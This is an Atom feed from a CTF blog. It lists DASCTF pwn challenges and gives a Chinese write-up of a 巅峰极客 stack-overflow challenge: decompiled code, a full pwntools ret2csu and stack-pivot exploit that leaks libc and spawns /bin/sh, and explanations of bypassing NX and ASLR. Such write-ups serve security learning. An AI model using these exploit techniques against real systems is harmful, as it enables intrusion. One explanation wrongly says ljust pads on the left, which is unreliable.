<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DU-玉</title>
  
  <subtitle>专心 追寻 珍惜</subtitle>
  <link href="https://poison-biao.github.io/atom.xml" rel="self"/>
  
  <link href="https://poison-biao.github.io/"/>
  <updated>2023-07-24T09:59:42.453Z</updated>
  <id>https://poison-biao.github.io/</id>
  
  <author>
    <name>DU-玉</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DASCTF</title>
    <link href="https://poison-biao.github.io/du-yu/dasctf.html"/>
    <id>https://poison-biao.github.io/du-yu/dasctf.html</id>
    <published>2023-07-23T18:15:00.000Z</published>
    <updated>2023-07-24T09:59:42.453Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、PWN"><a href="#一、PWN" class="headerlink" title="一、PWN"></a>一、PWN</h2><h3 id="1、FileEditor（附件pwn）"><a href="#1、FileEditor（附件pwn）" class="headerlink" title="1、FileEditor（附件pwn）"></a>1、FileEditor（附件pwn）</h3><p>题目：T1d师傅设计了一个文件编辑器，但是好像漏洞百出，请你帮他看看吧。</p><h3 id="2、signin（附件atta）"><a href="#2、signin（附件atta）" class="headerlink" title="2、signin（附件atta）"></a>2、signin（附件atta）</h3><p><strong>题目</strong>：Lotus听说0x401要办比赛，连夜出了一个签到题，快来看看吧</p><p>这些文件看起来像是一个Linux的内核映像（bzImage）、一个内核配置文件（config）、一个文件系统映像（roots.img）以及一个可能用于启动这些的脚本文件（run.sh）。</p><p>处理这些文件的具体方式取决于他们具体的内容和你的目标，但以下是一些一般性的步骤：</p><ol><li><strong>分析run.sh脚本</strong>：看一下run.sh文件中的内容。这个脚本可能会在虚拟环境（如QEMU）中启动bzImage和roots.img。如果脚本中存在命令行参数，那么这些参数可能在漏洞寻找过程中提供线索。</li><li><strong>分析bzImage文件</strong>：这是一个压缩的Linux内核映像。如果你怀疑内核中存在漏洞，你可能需要对其进行反汇编或者使用工具如IDA Pro进行深入的分析。你可以用像binwalk这样的工具查看bzImage中的内容。</li><li><strong>分析config文件</strong>：这是内核配置文件，可能包含有关内核构建选项的信息。查看此文件可能会提供有关可能存在的漏洞的线索。</li><li><strong>挂载和分析roots.img文件</strong>：这是文件系统映像。你可以在你的Linux系统上挂载它以查看其内容。分析文件系统中的文件和程序可能会发现一些有用的信息。</li><li><strong>启动虚拟机</strong>：最后，你应该使用run.sh脚本（或者类似的方式）在虚拟环境中启动这些文件，然后尝试找出并利用漏洞。</li></ol><h3 id="3、VIPhouse（附件）"><a href="#3、VIPhouse（附件）" class="headerlink" title="3、VIPhouse（附件）"></a>3、VIPhouse（附件）</h3><p><strong>题目</strong>：欢迎来到VIPhouse，听说你很了解canary，fmt，uaf，那来试试吧！</p><p>nc 118.24.24.233 9999</p><h3 id="4、DDLbook（pwn1-zip）"><a href="#4、DDLbook（pwn1-zip）" class="headerlink" title="4、DDLbook（pwn1.zip）"></a>4、DDLbook（pwn1.zip）</h3><p>T1d师傅总是忘记ddl，因此他给自己设计了一个ddl记事本，请你帮他把ddl记上去。</p><p>nc 132.232.105.182 8887</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、PWN&quot;&gt;&lt;a href=&quot;#一、PWN&quot; class=&quot;headerlink&quot; title=&quot;一、PWN&quot;&gt;&lt;/a&gt;一、PWN&lt;/h2&gt;&lt;h3 id=&quot;1、FileEditor（附件pwn）&quot;&gt;&lt;a href=&quot;#1、FileEditor（附件pwn）&quot; c</summary>
      
    
    
    
    <category term="CTF" scheme="https://poison-biao.github.io/categories/CTF/"/>
    
    
    <category term="DASCTF" scheme="https://poison-biao.github.io/tags/DASCTF/"/>
    
  </entry>
  
  <entry>
    <title>天网杯</title>
    <link href="https://poison-biao.github.io/du-yu/skynet.html"/>
    <id>https://poison-biao.github.io/du-yu/skynet.html</id>
    <published>2023-07-22T19:00:00.000Z</published>
    <updated>2023-07-23T18:22:34.565Z</updated>
    
    
    
    
    <category term="天网杯" scheme="https://poison-biao.github.io/categories/%E5%A4%A9%E7%BD%91%E6%9D%AF/"/>
    
    
    <category term="天网杯" scheme="https://poison-biao.github.io/tags/%E5%A4%A9%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客</title>
    <link href="https://poison-biao.github.io/du-yu/peakedness.html"/>
    <id>https://poison-biao.github.io/du-yu/peakedness.html</id>
    <published>2023-07-21T16:00:00.000Z</published>
    <updated>2023-07-24T09:59:50.039Z</updated>
    
    <content type="html"><![CDATA[<p>都学半个月了，还是一个PWN打不出来、又是自闭的一天，快学，真的不想当师傅们的破绽啊，淦 QAQ……….</p><p><a href="https://peekgeek.xctf.org.cn/race/dfjk">https://peekgeek.xctf.org.cn/race/dfjk</a></p><h2 id="一、PWN01-Linkmap"><a href="#一、PWN01-Linkmap" class="headerlink" title="一、PWN01 (Linkmap)"></a>一、PWN01 (Linkmap)</h2><h3 id="一、checksec"><a href="#一、checksec" class="headerlink" title="一、checksec"></a>一、checksec</h3><p><code>checksec</code> 的输出，这个命令是用来检查一个可执行文件的安全特性。从你给出的信息来看，该二进制文件有以下特性：</p><ul><li>Arch: amd64-64-little：程序的架构是 64 位的 AMD 或 x86。</li><li>Full RELRO：RELRO 是 RELocation Read-Only 的缩写，用于在程序运行期间保护某些程序内存段不被修改。全 RELRO 模式表示 GOT 表是只读的，防止了 overwrite attacks。</li><li>No canary found：这表明在栈上没有发现 stack canary，也就是说栈溢出保护未开启，这可能使程序容易受到 buffer overflow 攻击。</li><li>NX enabled：这表示内存中的 no-execute (NX) 位已启用。也就是说，将内存标记为数据并阻止执行，使得攻击者无法在数据段（例如堆或栈）中插入并执行 shellcode。</li><li>No PIE：PIE 是 Position Independent Executable 的缩写，如果没有开启，那么程序每次加载时，其位置将是固定的，否则每次程序运行时加载到内存的地址都会发生变化。不开启 PIE 使得程序易受到 Return Oriented Programming (ROP) 或 Jump Oriented Programming (JOP) 攻击。</li></ul><p>综上，从这个二进制文件的特性来看，该二进制文件可能最容易受到栈溢出攻击，因为没有开启 stack canary。同时，由于没有启用 PIE，使其也可能受到 ROP 或 JOP 攻击。</p><p>在做进一步的二进制漏洞利用时，应当首先试图探查这些可能的攻击方式，分析软件的详细行为，可能的漏洞和缓冲区溢出的地方。</p><h3 id="二、C源代码"><a href="#二、C源代码" class="headerlink" title="二、C源代码"></a>二、C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">// positive sp value has been detected, the output may be wrong!// 检测到了正的sp值，输出可能是错误的！void __fastcall __norestart start(__int64 a1, __int64 a2, void (*a3)(void))// 定义一个不返回（__noreturn）的函数start，它接受两个__int64类型参数和一个函数指针参数。{  __int64 v3; // rax  // 定义一个__int64类型的变量v3，表示rax寄存器。  int v4; // esi  // 定义一个整型变量v4，表示esi寄存器。  __int64 v5; // [rsp-8h] [rbp-8h] BYREF  // 定义一个__int64类型的变量v5，表示栈上的数据。  char *retaddr; // [rsp+0h] [rbp+0h] BYREF  // 定义一个字符型指针变量retaddr，表示返回地址。  v4 = v5;  // 将v5的值赋给v4。  v5 = v3;  // 将v3的值赋给v5。  _libc_start_main(main, v4, &amp;retaddr, init, fini, a3, &amp;v5);  // 调用_libc_start_main函数，将程序控制权转交给main函数，同时设定了程序的初始化和结束时的操作。  __halt();  // 执行停止指令，结束程序。}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">// attributes: thunkint __fastcall _libc_start_main(        int (__fastcall *main)(int, char **, char **),        int argc,        char **ubp_av,        void (*init)(void),        void (*fini)(void),        void (*rtld_fini)(void),        void *stack_end){  return __libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  sub_40071B(a1, a2, a3);  read(0, buf, 0x100uLL);  return 0LL;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">int sub_40071B(){  return setvbuf(stdin, 0LL, 2, 0LL);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> <code>sub_40071B</code> 函数中，调用了 <code>setvbuf(stdin, 0LL, 2, 0LL);</code>，这个函数调用设置了 <code>stdin</code> 的缓冲方式为无缓冲（<code>_IONBF</code>，对应的值为2），并且没有为其指定自定义的缓冲区（因为 <code>buffer</code> 参数为 <code>NULL</code>）。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">// attributes: thunkint setvbuf(FILE *stream, char *buf, int modes, size_t n){  return __imp_setvbuf(stream, buf, modes, n);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>setvbuf</code> 函数只是简单地调用了 <code>__imp_setvbuf</code> 函数。这是一个典型的转发函数（thunk），它的功能只是将函数调用转发给另一个函数。这样的设计常常是因为存在库函数被别的库函数替代的情况，或者为了实现一些特定的编程模式，例如动态链接或者延迟加载等。</p><p>在这个函数中，<code>__imp_setvbuf</code> 函数应该与标准的 <code>setvbuf</code> 函数具有相同的功能，也就是设置给定文件流的缓冲模式。这个函数的参数意义如下：</p><ul><li><code>stream</code>：这是一个 <code>FILE *</code> 类型的指针，表示要设置缓冲模式的文件流。</li><li><code>buf</code>：这是一个 <code>char *</code> 类型的指针，表示要设置的缓冲区。如果这个参数为 <code>NULL</code>，那么系统会自动管理缓冲区。</li><li><code>modes</code>：这是一个 <code>int</code> 类型的变量，用来设置缓冲模式。这个参数可以是 <code>_IOFBF</code>（完全缓冲）、<code>_IOLBF</code>（行缓冲）或者 <code>_IONBF</code>（无缓冲）中的一个。</li><li><code>n</code>：这是一个 <code>size_t</code> 类型的变量，表示缓冲区的大小。</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __fastcall init(unsigned int a1, __int64 a2, __int64 a3){  signed __int64 v4; // rbp  __int64 i; // rbx  v4 = &amp;off_600DF0 - off_600DE8;  init_proc();  if ( v4 )  {    for ( i = 0LL; i != v4; ++i )      ((void (__fastcall *)(_QWORD, __int64, __int64))off_600DE8[i])(a1, a2, a3);  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>v4</code> 不为零（即 <code>&amp;off_600DF0 - off_600DE8</code> 不为零），它将会在一个循环中执行一系列函数。这些函数的地址被保存在 <code>off_600DE8</code> 开始的地址空间中。</p><p>它使用了三个参数 <code>a1</code>, <code>a2</code>, 和 <code>a3</code>，这些参数在循环中被传递给每一个被调用的函数。因为我们没有这些函数的具体信息，我们无法得知这些参数的具体用途。</p><p>这个函数可能是在程序初始化时被调用的，用来执行一系列的初始化操作。如果 <code>&amp;off_600DF0 - off_600DE8</code> 不为零，那么就会有一系列的函数被调用，每一个函数的地址被保存在 <code>off_600DE8</code> 开始的地址空间中。这是一种常见的程序设计模式，例如在C++中的全局对象构造函数或者静态初始化就会使用类似的机制。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">void *init_proc(){  void *result; // rax  result = &amp;__gmon_start__;  if ( &amp;__gmon_start__ )    return (void *)_gmon_start__();  return result;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>init_proc</code> 函数在这里看起来主要是关于gmon的相关操作。gmon是GNU Profiling程序的一部分，它用于收集程序执行过程中的一些统计信息，以便于分析程序的性能。</p><p><code>__gmon_start__</code> 是在gmon中使用的特殊符号，当链接了gmon库时，<code>__gmon_start__</code> 会被定义。当程序启动时，如果 <code>__gmon_start__</code> 已经被定义，那么会自动调用 <code>__gmon_start__</code> 函数，开始收集性能统计信息。</p><p>在 <code>init_proc</code> 函数中，它首先检查 <code>__gmon_start__</code> 是否已经被定义，如果已经定义，就调用 <code>_gmon_start__()</code> 函数，否则什么都不做。</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>这个问题涉及到一个称为 “linkmap” 的技术。在 Linux 中，linkmap 是一个数据结构，用于在加载动态库时存储有关库的信息。当一个程序加载多个动态库时，会有一个 linkmap 链表来存储这些库的信息。</p><p>由于这个程序存在栈溢出漏洞，并且开启了 NX，没有开启 PIE，所以可以使用 ROP（Return-oriented programming）来构造攻击。而 “linkmap” 的技术则可以帮助我们找到动态库中函数的地址，从而绕过 ASLR。</p><p>构造攻击代码需要对具体的二进制程序进行详细分析，我们需要知道如何利用 linkmap 来获取函数地址，以及如何利用栈溢出来控制程序执行流程。另外，需要注意的是，网络连接的代码可能需要根据实际环境进行修改。</p><p>下面是一个基本的 Python 代码模板，使用 pwntools 库来连接到远程服务。这个模板尚未包含具体的攻击代码，你需要根据实际的二进制程序来完成攻击代码的编写：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *def exploit():    # 连接到远程服务    conn = remote("pwn-5bdeb2b31c.challenge.xctf.org.cn", 9999, ssl=True)    # 这里添加你的攻击代码，例如发送一个包含 ROP 链的字符串    # 让程序继续执行，直到结束或者触发一个异常    conn.interactive()if __name__ == "__main__":    exploit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个模板中，你需要在 <code># 这里添加你的攻击代码</code> 的位置编写攻击代码，然后通过 <code>conn.send</code> 或者 <code>conn.sendline</code> 发送攻击代码。具体的攻击代码需要根据二进制程序的细节来编写。</p><ul><li><p>“栈溢出漏洞”：这是指由于程序没有正确的检查输入的长度，导致可以向一个栈分配的缓冲区写入过多的数据，从而覆盖其他在栈上的数据。在你的程序中，这种情况发生在 <code>main</code> 函数中，当程序尝试从标准输入读取256字节的数据并将其存储在一个只有16字节的缓冲区中。</p></li><li><p>“NX”：这是一个安全机制，全称为 “No eXecute”，也被称为 “Data Execution Prevention (DEP)”。启用了 NX 之后，程序不能执行存储在数据段（如堆和栈）的代码。这使得攻击者不能简单地向缓冲区写入一段代码然后执行。</p></li><li><p>“没有开启 PIE”：PIE 是 “Position Independent Executable” 的缩写。如果没有启用 PIE，那么程序每次执行时都会被加载到同一个内存地址。这使得攻击者可以预知代码段的地址，这在进行ROP攻击时是非常有用的。</p></li><li><p>“ROP（Return-oriented programming）”：这是一种利用已经存在于内存中的代码片段（称为 “gadgets”）来绕过NX的技术。由于程序的代码段是可执行的，攻击者可以通过修改栈上的返回地址，让程序执行代码段中的一段代码，然后返回，再执行另一段代码，以此类推。</p></li><li><p>“linkmap”：在 Linux 中，当一个动态库被加载时，会有一个称为 “linkmap” 的数据结构来存储有关该库的信息。这个数据结构中包含了动态库的加载地址，以及一些其他的信息。攻击者可以通过读取和解析这个数据结构，来找到动态库中函数的实际地址，从而绕过地址随机化（ASLR）。</p></li><li><p>“ASLR”：这是 “Address Space Layout Randomization” 的缩写，是一个安全机制，它会在每次程序执行时随机化内存的布局，使得攻击者不能预知代码和数据的地址。然而，由于你的程序没有启用 PIE，并且动态库的加载地址可以通过解析 linkmap 来获取，所以攻击者可以绕过 ASLR。</p></li></ul><h3 id="ret2csu-exp-py（非预期）"><a href="#ret2csu-exp-py（非预期）" class="headerlink" title="ret2csu  -  exp.py（非预期）"></a>ret2csu  -  exp.py（非预期）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import* # 导入pwn库，包含了大量的工具来创建和交互与远程服务或者本地进程，便于二进制漏洞利用context.log_level='debug' # 设置日志级别为debug，这样程序会打印出所有的交互数据context.arch='amd64' # 设置目标的架构为amd64s = lambda data : p.send(data) # 定义函数s，发送数据到目标sl = lambda data : p.sendline(data) # 定义函数sl，发送数据到目标并附带一个换行符sa = lambda text, data : p.sendafter(text, data) # 定义函数sa，等待接收到特定的文本后发送数据sla = lambda text, data : p.sendlineafter(text, data) # 定义函数sla，等待接收到特定的文本后发送数据并附带一个换行符r = lambda : p.recv() # 定义函数r，接收数据rn = lambda x  : p.recvn(x) # 定义函数rn，接收指定数量的数据ru = lambda text : p.recvuntil(text) # 定义函数ru，接收数据直到接收到特定的文本dbg = lambda text=None  : gdb.attach(p, text) # 定义函数dbg，附加gdb到目标进程uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00')) # 定义函数uu32，接收数据并转换为32位无符号整数uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) # 定义函数uu64，接收数据并转换为64位无符号整数lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) # 定义函数lg，打印带有颜色的日志信息pr = lambda s : print('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) # 定义函数pr，打印带有颜色的字符串# 定义函数mydbg，附加gdb并连接到ida进行远程调试def mydbg():  gdb.attach(p,"decompiler connect ida --host 192.168.1.102 --port 3662 ")  pause()# 定义一些在ROP攻击中需要用到的地址pop_rdi=0x00000000004007e3pop_rsi=0x00000000004007e1bss_0601040=0x0601040pop_rsp=0x00000000004007ddread_plt=0x4004E0read_got=0x600FD8pop6_addr=0x4007DAmov_addr=0x04007C0bss_addr=0x601200ret=0x00000000004004c9i=0 # 初始化变量i为0while True: # 死循环    try:        lg("i") # 打印日志信息，输出i的值        i=i+1 # i加1        # p=remote("pwn-1f975f76e2.challenge.xctf.org.cn", 9999, ssl=True) # 连接远程服务        p=process('./ezzzz') # 启动本地进程        elf=ELF('./ezzzz') # 打开本地的ELF文件        libc=elf.libc # 获取本地的libc库        # 构造ROP链并发送        payload=b'a'*0x18+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_0601040)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0)+p64(0x400606)        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(0x300)+p64(bss_addr)+p64(0)+p64(mov_addr)+p64(0)*7        payload+=p64(pop_rsp)+p64(bss_addr)        mydbg() # 附加gdb并连接到ida进行远程调试        sl(payload) # 发送ROP链        pause() # 暂停        sl(p64(read_got)) # 发送read_got的地址        # 构造第二个ROP链并发送        payload=p64(0)*3+p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(bss_0601040-6)+p64(0)+p64(mov_addr)+p64(0)*7        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(bss_0601040)+p64(0x8)+p64(read_got)+p64(1)+p64(mov_addr)+p64(0)*7        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(0x100)+p64(bss_addr+0xa00)+p64(0)+p64(mov_addr)+p64(0)*7        payload+=p64(pop_rsp)+p64(bss_addr+0xa00)        pause() # 暂停        sl(payload) # 发送第二个ROP链        pause() # 暂停        s("\x00\x00\x00\x00\x00\x00\x20\x4a") # 发送数据        libc_base=uu64()-libc.sym['read'] # 计算libc的基地址        system=libc_base+libc.sym['system'] # 计算system函数的地址        binsh=libc_base+next(libc.search(b"/bin/sh")) # 计算"/bin/sh"字符串的地址        lg("libc_base") # 打印日志信息，输出libc_base的值        # 构造第三个ROP链并发送        payload=p64(0)*3+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)        pause() # 暂停        sl(payload) # 发送    p.interactive() # 开始交互模式，此时可以输入shell命令，如ls，pwd等，并看到结果    except EOFError: # 如果捕获到EOFError异常        p.close() # 关闭与目标的连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、这个脚本运行的大致步骤是："><a href="#三、这个脚本运行的大致步骤是：" class="headerlink" title="三、这个脚本运行的大致步骤是："></a>三、这个脚本运行的大致步骤是：</h3><ol><li><p>启动目标进程。</p></li><li><p>构造一个ROP链，用于泄露”read”函数的地址，从而计算出libc库的基地址。</p></li><li><p>利用计算出的libc库的基地址，构造一个新的ROP链，用于调用”system”函数执行”/bin/sh”命令。</p></li><li><p>如果目标进程在这个过程中退出了（可能是因为ROP链有错误，或者因为防御机制阻止了攻击），则开始下一轮的尝试。、</p><p>在这个脚本中，攻击者首先通过 sub_400606 函数泄露了 read 函数在 libc 中的实际地址，然后通过地址偏移计算出 libc 的基址，以及 system 函数和 “/bin/sh” 字符串在 libc 中的地址，然后构造 payload，将返回地址修改为 system 函数的地址，实现执行任意命令，这是一个典型的 ret2libc 攻击。</p></li></ol><h3 id="四、ret2csu"><a href="#四、ret2csu" class="headerlink" title="四、ret2csu"></a>四、ret2csu</h3><p>这是一个有关二进制漏洞利用的问题，主要采用了 Return Oriented Programming (ROP)，”ret2csu”，和栈迁移技术来执行任意代码。程序开启了”full relro”，防止了对.got表的直接修改，因此不能直接使用dl-resolve技巧来构造任意函数调用。</p><p>这个解题思路是在IDA中找到一个特别的函数sub_400606。这个函数读取了一个特定地址（在这里是601040 + a1）处的值，然后写回到相同的地址。因此，如果a1为0，那么这个函数就实际上进行了一次地址的取值操作。这种特性可以被用来读取read函数在.got表中的地址，然后将read的libc地址写入到601040处。</p><p>解题人还发现了，对于他们所使用的libc版本（2.35），read和write函数在libc中的地址仅相差最后两个字节。因此，解题人可以尝试多次改变601040处的值，使其变为write的libc地址，这可以通过改变read的.got表项来实现。注意，在此过程中，他们并未直接修改.got表，而是修改了该地址在内存中的一个副本，这样就绕过了full relro的限制。</p><p>接下来，他们使用”write”函数来泄露read在.got表中的地址，从而计算出libc的基址。有了libc的基址，就可以找到system函数的地址，并使用”/bin/sh”字符串来调用它，从而获得一个shell。</p><p>“ret2csu”是一种利用程序的__libc_csu_init函数中的一段gadget来进行任意函数调用的技术。在这个题解中，解题人使用它来调用sub_400606函数和write函数。</p><p>“栈迁移”则是将栈指针（rsp）移动到新的位置，通常是为了获得更多的可控空间，或者绕过某些防护机制。在这个题解中，解题人通过栈迁移来构造长的ROP链。</p><h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><p>当寻找二进制漏洞和构建漏洞利用链时，研究者并不总是仅限于查看main函数。虽然main函数是程序的入口点，但是它可能并不包含可以被利用的漏洞或者有用的函数。此外，有时候，main函数中的代码可能由于各种原因（比如控制流保护机制）而无法被直接利用。</p><p>在这种情况下，研究者会在整个程序的代码中寻找可以被利用的函数或片段（也被称为”gadget”）。这些函数或片段可能位于任何地方，包括库函数、系统调用，或者其他不常用的函数。它们的特性可能有助于绕过某些保护机制，或者提供了执行特定操作的能力，比如修改内存、执行系统调用、或者跳转到其他位置。</p><p>在这个问题中，研究者发现了函数sub_400606，它具有特殊的属性，可以用于读取和修改内存，这对于构建漏洞利用链是非常有用的。这也就是为什么他们会去查看并使用这个函数，而不是只关注main函数。</p><p>总的来说，寻找和利用二进制漏洞需要对整个程序的代码进行全面的分析和理解，而不仅仅是main函数。这也是二进制漏洞分析和利用的一项重要技能。</p><h3 id="六、利用已知地址制造栈溢出"><a href="#六、利用已知地址制造栈溢出" class="headerlink" title="六、利用已知地址制造栈溢出"></a>六、利用已知地址制造栈溢出</h3><p>栈溢出是一种常见的漏洞，通过编写超出预定缓冲区大小的数据，可以覆盖掉在内存中后续的数据，比如函数返回地址。一旦函数返回地址被覆盖，就可以改变程序的执行流程。</p><p>在经典的栈溢出利用场景中，常常会看到通过泄露 libc 函数（例如 puts、printf 等）的地址来绕过 ASLR(Address Space Layout Randomization，地址空间布局随机化)的保护。因为在启动 ASLR 保护的情况下，每次程序启动时，动态库（例如 libc.so）的加载地址是随机的。通过泄露某个已知函数的实际运行时地址，可以计算出动态库的基地址，进一步找到其他函数（例如 system）的地址，从而绕过 ASLR。</p><p>在这个问题中，你可能在看到没有 puts 或者类似函数来泄露地址时会感到困惑。但其实，这个题目中，利用的是 sub_400606 函数的特性，把 read 的 got 表项地址写入到 601040，然后通过执行 sub_400606 函数，将 read 在 libc 中的实际地址写入到 601040，从而实现了信息泄露。通过这种方式，可以得到 libc 中 read 函数的实际地址，从而可以计算出 libc 的基地址。</p><p>所以这是一种不同于经典的通过泄露函数地址来绕过 ASLR 的方法，而是通过利用程序特性来泄露信息，达到绕过 ASLR 的目的。</p><p>根据你给出的题解中对 sub_400606 函数的分析，该函数的功能是读取特定内存位置的值（在 qword_601040 + a1 的位置），并将这个值写入到其他的特定内存位置。</p><p>这个函数没有明确的任务，它只是对内存进行操作，具体的用途则取决于这个函数在程序中被如何使用。</p><p>现在来解释为什么把 read 的 GOT 表项地址写入 601040 后，执行 sub_400606 函数后写入 601040 的却是 read 在 libc 中的实际地址。</p><p>这是因为，在程序执行过程中，当执行到调用 read 函数的位置时，程序实际上会跳转到 GOT 表中的 read 表项的地址去执行。而这个 read 表项的地址中，保存的是 read 函数在 libc 中的实际地址（这是程序在加载时动态链接器做的事情）。也就是说，这个 GOT 表项其实是一个指针，指向 libc 中的 read 函数。</p><p>因此，如果我们把 read 的 GOT 表项地址写入 601040，然后执行 sub_400606 函数，函数就会去读取 qword_601040 + a1 的值，这里实际上就是读取的 read 的 GOT 表项，也就是 read 函数在 libc 中的实际地址。然后，这个函数又把这个地址写入了 601040，实现了信息泄露。</p><h3 id="七、函数定义"><a href="#七、函数定义" class="headerlink" title="七、函数定义"></a>七、函数定义</h3><ol><li><code>s = lambda data : p.send(data)</code>：这是一个匿名函数，简化了p.send(data)的操作，可以用<code>s(data)</code>的方式发送数据，其中<code>p</code>是一个socket对象，代表目标程序的一个连接。</li><li><code>sl = lambda data : p.sendline(data)</code>：这个函数将给定的数据以一行的形式发送给目标程序。它在数据末尾添加一个换行符(‘\n’)，因为某些程序的输入是按行接收的。</li><li><code>sa = lambda text, data : p.sendafter(text, data)</code>：这个函数将等待目标程序输出特定的文本，然后发送数据。这个函数在输入需要同步特定输出时很有用。</li><li><code>sla = lambda text, data : p.sendlineafter(text, data)</code>：这个函数和<code>sa</code>的功能类似，但是在发送数据时会自动添加换行符。</li><li><code>r = lambda : p.recv()</code>：这个函数简化了接收数据的操作，可以直接用<code>r()</code>接收目标程序发送的数据。</li><li><code>rn = lambda x : p.recvn(x)</code>：这个函数可以接收指定数量的数据。</li><li><code>ru = lambda text : p.recvuntil(text)</code>：这个函数将从目标程序接收数据，直到遇到特定的文本。</li><li><code>dbg = lambda text=None : gdb.attach(p, text)</code>：这个函数将GDB附加到目标进程上，可以用来进行调试。</li><li><code>uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))</code>：这个函数从目标程序接收数据，并将接收到的4个字节数据转换为32位无符号整数。</li><li><code>uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</code>：这个函数从目标程序接收数据，并将接收到的6个字节数据转换为64位无符号整数。</li><li><code>lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))</code>：这个函数打印带有颜色的日志信息，红色的部分是变量名，其后的十六进制数值是变量值。</li><li><code>pr = lambda s : print('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))</code>：这个函数打印带有颜色的字符串，和<code>lg</code>类似。</li></ol><p>无符号数并不一定是十六进制的，无符号数只是一种表示整数的方式，它只能表示非负整数。十六进制是一种数制，可以用来表示任何整数，无论是有符号的还是无符号的。</p><p>函数<code>u32(data)</code>是一个在pwntools库中常用的函数，它将一个包含4个字节的字符串或字节串转换为一个32位的无符号整数。这个函数常常用在二进制漏洞利用中，例如在处理来自目标程序的内存泄漏信息时。</p><p>当函数<code>uu32</code>被调用时，它将从目标程序接收数据，直到接收到字节0xf7（在ASCII中，0xf7对应的字符是除号’÷’）。然后，它会取接收到的数据的最后4个字节，并使用<code>ljust(4, b'\x00')</code>来确保这个字节串的长度至少为4字节。如果长度不足4字节，就会在其左侧（高位）补充零字节，直到长度达到4字节。最后，它将这4个字节的数据使用<code>u32</code>函数转换为一个32位的无符号整数。</p><p>这里涉及的字节串到整数的转换是基于小端字节序的，也就是说，字节串的低位字节对应整数的低位字节。这是因为x86和x86_64架构的计算机使用小端字节序，而大多数二进制漏洞利用目标程序都运行在这些架构的计算机上。</p><h3 id="八、uu32-x3D-lambda-u32-p-recvuntil-b”-xf7”-4-ljust-4-b’-x00’"><a href="#八、uu32-x3D-lambda-u32-p-recvuntil-b”-xf7”-4-ljust-4-b’-x00’" class="headerlink" title="八、uu32 = lambda : u32(p.recvuntil(b”\xf7”)[-4:].ljust(4, b’\x00’))"></a>八、uu32 = lambda : u32(p.recvuntil(b”\xf7”)[-4:].ljust(4, 